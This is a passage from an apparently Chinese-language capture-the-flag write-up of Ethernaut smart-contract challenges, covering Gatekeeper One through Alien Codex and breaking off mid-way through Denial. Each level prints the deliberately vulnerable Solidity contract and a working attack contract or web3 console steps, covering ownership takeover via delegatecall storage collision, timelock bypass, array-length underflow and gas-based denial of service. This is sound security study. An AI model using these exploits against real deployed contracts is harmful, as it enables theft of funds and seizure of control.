要求俩边不相等，只需要高 4 字节中有任何一个bit不为0即可；</li><li>由第一个require可以知道<code>uint32(uint64(_gateKey))</code>应该是类似<code>0x0000beef</code>这种形式，所以需要让最低的2个字节和<code>tx.orign</code>地址里最低的2个字节相同，即_gateKey的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        // 设置为题目地址</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key=0xAAAAAAAA0000c7e5;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">            (bool result, bytes memory data) = address(target).call.gas(i+150+8191*3)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne = GatekeeperOne(target);</span><br><span class="line">        entrant = gatekeeperOne.entrant();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这道题目中的<code>gateOne</code>与上一次相同，部署一个合约在合约中调用即可；</p></li><li><p><code>gateTwo</code>涉及到汇编语言，<strong>extcodesize</strong>表示返回对应地址的合约代码的大小，其中 <code>caller()</code>返回的是<code>call sender</code>即调用的发起者，如果<code>extcodesize</code>的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。<code>extcodesize</code>具有一个特性：当合约处于部署阶段时，<code>extcodesize</code>的值为 0，如果我们在<code>constructor</code>中调用这个函数的话，那么<code>extcodesize(caller())</code>返回0，因此可以绕过检查。</p></li><li><p><code>gateThree</code>是一个异或，所以可以知道<code>_gateKey)=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1))</code></p></li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public target;</span><br><span class="line">    bytes8 key;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target=_addr;</span><br><span class="line">        key=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1));</span><br><span class="line">        (bool result,)=target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-Naugth-Coin"><a href="#15-Naugth-Coin" class="headerlink" title="15. Naugth Coin"></a>15. Naugth Coin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题要求将题目中的所有token转出，但是题目中对 <code>transfer</code>函数作出了限制，<code>player</code>只有在10年后才可以进行转账操作，但是因为只限制了<code>transfer</code>函数的<code>msg.sender</code>不能为<code>player</code>，但在 ERC20 中还有另一个转账函数<code>transferFrom</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在转账前需要先使用<code>approve</code>函数进行授权，然后再调用次函数进行转账。</p><p>解题步骤：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">value = <span class="string">&#x27;1000000000000000000000000&#x27;</span></span><br><span class="line"><span class="comment">//授权</span></span><br><span class="line"><span class="keyword">await</span> contract.approve(player,value)</span><br><span class="line"><span class="comment">//转账到任意地址</span></span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">&#x27;other address&#x27;</span>,value)</span><br></pre></td></tr></table></figure><h3 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成该题目的要求是成为合约的 owner，而成为 owner 的要点就在于<code>delegatecall</code>，Preservation 合约中的俩个函数中的<code>delegatecall</code>调用的都是<code>setTime </code>函数，这个函数可以修改全局变量中的    <code>storagedTime</code>变量。</p><p>对于 Preservation 合约的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone1Library (20 bytes)slot 0   </span><br><span class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone2Library (20 bytes)slot 1</span><br><span class="line">===================================================        </span><br><span class="line">    unused (12 bytes) | owner (20 bytes)                  slot 2</span><br><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)    slot 3</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure><p>对于 LibraryContract 合约的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)                           slot 0</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure><p>当合约初始化时，<code>Preservation</code> 的 slot 0 和 slot 1 存储的是 LibraryContract 合约的地址，slot 2 存储的是 owner 的地址，因此我们的最终目的就是将 slot 2 修改为player 的地址。</p><p>当我们调用<code>setFirstTime</code>函数时，实际上是在<code>Preservation</code>合约内部调用<code>setTme</code>函数，此时修改的变量时slot 0，我们可以利用这一点去修改<code>timeZone1Library</code>=变量的值，所以我们可以将其设置为恶意合约的地址，并在恶意合约内写一个<code>setTime</code>函数，当执行<code>setFirstTime</code>函数时，就会调用到我们恶意合约内部的<code>setTime</code>函数，那么就可以实现合约的任意代码执行，实现变量覆盖。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract PreservationExploit &#123;</span><br><span class="line">      address public timeZone1Library;</span><br><span class="line">      address public timeZone2Library;</span><br><span class="line">      address public owner; </span><br><span class="line">      </span><br><span class="line">      function setTime(uint256 timestamp) public &#123;</span><br><span class="line">          owner = address(timestamp);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击步骤：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;攻击合约地址&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;player&#x27;</span>);</span><br></pre></td></tr></table></figure><p>调用<code>setFirstTime</code>俩次，实现俩次变量覆盖。</p><h3 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成这道题目的要求是找到丢失的合约地址找回丢失的0.5个以太币。思路是可以通过在<code>https://rinkeby.etherscan.io/</code>中查询<code>Recover</code>合约对应的地址，查看该合约的 <strong>Internal Txns</strong>从中找到创建的<code>SimpleToken</code>合约的地址。</p><p><img src="/image/Ethernaut.assets/image-20220922133444783.png" alt="image-20220922133444783"></p><p>在获取到<code>SimpleToken</code>地址后就可以调用合约中的 <code>destory</code>函数即可。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface SimpleToken &#123;</span><br><span class="line">    function destroy(address payable _to) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    address SimpleTokenAddr;</span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        SimpleTokenAddr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        SimpleToken(SimpleTokenAddr).destroy(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种计算到合约地址的方法，每个账户都有一个关联的 nonce：对于普通账户，它在每笔交易中都会增加，而对于合约账户，它会在每次合约创建时增加。随机数不能重复使用，它们必须是顺序的</p><p><code>newAddr = keccak256(address, nonce)</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address, to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mk_contract_address</span>(<span class="params">sender: <span class="built_in">str</span>, nonce: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Create a contract address using eth-utils.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # https://ethereum.stackexchange.com/a/761/620</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sender_bytes = to_bytes(hexstr=sender)</span><br><span class="line">    raw = rlp.encode([sender_bytes, nonce])</span><br><span class="line">    h = keccak(raw)</span><br><span class="line">    address_bytes = h[<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> to_checksum_address(address_bytes)</span><br></pre></td></tr></table></figure><h3 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目需要利用汇编语言部署一个微型合约。</p><p>首先需要了解合约在创建时会发生涉什么：</p><p><img src="/image/Ethernaut.assets/1*5Wrb7z3W6AMtjH6IKJYowg.jpeg" alt="img"></p><p>在初始化合约时：</p><ol><li><p>用户或合约向以太网发送交易，此交易包含数据，但是不包含接受者的地址。只是向EVM表明这是一个<code>contract Creation</code>，不是常规的事务。</p></li><li><p>然后EVM将Solidity代码编译为机器可读的字节码，字节码会转换为在调用栈中执行的操作码。</p><blockquote><p>创建合约的字节码包含合约初始化代码和合约运行时代码。</p></blockquote></li><li><p>在合约的创建过程中，EVM 只执行初始化代码直到执行堆栈中的第一个 <strong>STOP</strong> 或 <strong>RETURN</strong>指令，在这个阶段，合约的构造函数**(constructor()**)会执行并产生一个合约地址。</p></li><li><p>当初始代码运行后，只有运行时（runtime code）代码会保留在栈上，然后将这些操作码复制到内存中并返回到EVM。</p></li><li><p>最后，<strong>EVM</strong>将返回的剩余代码存储在 storage 中，并且与新的合约地址相关联。</p></li></ol><p>题目要求我们给出一个合约地址，该合约需要返回<code>whatIsTheMeaningOfLife()</code>的正确数字，这个数字题目中给出提示是42，而且这道题目还有一个要求，合约中只能有10个操作码，所以需要手动编写一个程序。</p><ol><li><p>首先运行时代码（runtime code）：构造返回42的逻辑，返回<code>0x42</code>且小于10个操作码。最后一条命令一定是<strong>RETURN</strong>，而<strong>RETURN</strong>命令返回时，栈顶（stack[0]）对应的数字是<strong>offset</strong>，stack[1]是<strong>length</strong>，最终返回的是<code>memory[offset:offset+length]</code>，所以需要把返回值42存储到<strong>memory</strong>中，代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x2a</span><br><span class="line">0002  60  PUSH1 0x50</span><br><span class="line">0004  52  mstore</span><br><span class="line">0007  60  PUSH1 0x20</span><br><span class="line">0009  60  PUSH1 0x50  //低位用来存储运行时代码</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure><p>对应的字节码为<code>602a60505260206050f3</code>正好10个opcode，即正好10个字节</p></li><li><p>运行时代码构造完成后还需要在之前加上初始化代码，即将运行时代码复制到<code>memory</code>中，然后再RETURN，否则无法直接运行，复制代码需要用到<code>CODECOPY</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x0a //length</span><br><span class="line">0002  60  PUSH1 0x0c</span><br><span class="line">0004  60  PUSH1 0x00</span><br><span class="line">0006  39  CODECOPY</span><br><span class="line">0007  60  PUSH1 0x0a</span><br><span class="line">0009  60  PUSH1 0x00</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure><p>第一步<code>PUSH1 0x0a</code>对应的是<strong>length</strong>变量，因为我们上面构造的<strong>opcode</strong>序列长度为10。第二步<code>PUSH1 0x0c</code>是因为，初始化代码的长度为0x0B，也就是运行时代码的字节码是从 0x0c 偏移开始的，因此<code>offset</code>为0xc。第三步<code>PUSH1 0</code>是指定将我们的代码复制到内存的slot 0处。前4条指令，<strong>完成了将0xC到0x16这10个字节复制到memory的0x00到0xA位置处的任务</strong>。</p><p>最终的代码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000    60            PUSH1 0x0a</span><br><span class="line">0002    60            PUSH1 0x0c</span><br><span class="line">0004    60            PUSH1 0x00</span><br><span class="line">0006    39            CODECOPY</span><br><span class="line">0007    60            PUSH1 0x0a</span><br><span class="line">0009    60            PUSH1 0x00</span><br><span class="line">000B    F3            RETURN</span><br><span class="line">000C    60            PUSH1 0x2a</span><br><span class="line">000E    60            PUSH1 0x50</span><br><span class="line">0010    52            MSTORE</span><br><span class="line">0011    60            PUSH1 0x20</span><br><span class="line">0013    60            PUSH1 0x50</span><br><span class="line">0015    F3            RETURN</span><br></pre></td></tr></table></figure><p>对应的字节码序列为<code>600a600c600039600a6000f3602a60505260206050f3</code></p><p>使用we b3.js部署</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bytecode=<span class="string">&#x27;600a600c600039600a6000f3602a60505260206050f3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>:player,<span class="attr">data</span>:bytecode&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&#x27;0xF2AD1B93CFdCA35a97b69De0c3664033fEbeEE33&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">  codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求玩家获取到合约的控制权。合约中在开头引入了<code>Ownable</code>合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        emit OwnershipTransferred(address(0), _owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0));</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   在<code>Ownable</code>合约中有一个 address类型的变量  <code>_Owner</code>，只占用20字节，所有变量 <code>contact</code>和其存储在一个插槽中即存放在 slot 0中，而<code>codex.length</code>存储在 slot 1中，由于在合约初始化后动态数据为空，所以slot 1为 0，可以思考利用 <code>record</code>函数向动态数组中写入内容，覆盖掉 slot 0的低位的20字节，将其未覆盖为 player 的地址。</p><p><img src="/image/Ethernaut.assets/image-20220711212845554.png" alt="image-20220711212845554"></p><ol><li><p>由于slot 1的初始值为0，调用<code>retract</code>函数可以让<code>codex.length</code>减1，代码中没有对动态数组的长度进行溢出检查，可以让slot 1 存储的值下溢，slot 1 的值为$2^{256}-1$</p><blockquote><p>Solidity中动态数组内变量的存储位计算方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b[X] == SLOAD(keccak256(slot) + X)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>然后计算动态数组第一个元素的存储位置<code>keccack256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>，所以$2^256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$得到的就是slot 0和codex动态数组的首地址偏移。</p></li><li><p>通过revise函数设置对应的偏移</p><p><code>contract.revise(&#39;offset&#39;,&#39;player&#39;) </code></p></li></ol><h3 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(100);</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是一个简单的钱包，会随着时间的推移而流失资金。玩家可以成为提款伙伴，慢慢提款。 当玩家在所有者调用withdraw() 时拒绝提取资金，就可以通过这道题目。</p><p>即当 owner 进行取款操作时，要阻止 <code>owner.transfer</code>操作，让合约仍有余额，并且交易的 gas 为 1M 或者更少时就可以通过。</p><p>这道题的主要漏洞在于<code>pathner.call</code>在调用call函数时没有检查返回值，也没有制定gas，这就<strong>导致如果外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现<code>out of gas</code>的错误</strong>，然后发生<code>revert</code>，自然就无法执行<code>own.transfer</code>操作。</p><p><strong>攻击合约：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack &#123;</span><br><span class="line">address public target;</span><br><span class="line">constructor(address _addr) public payable &#123;</span><br><span class="line">target = 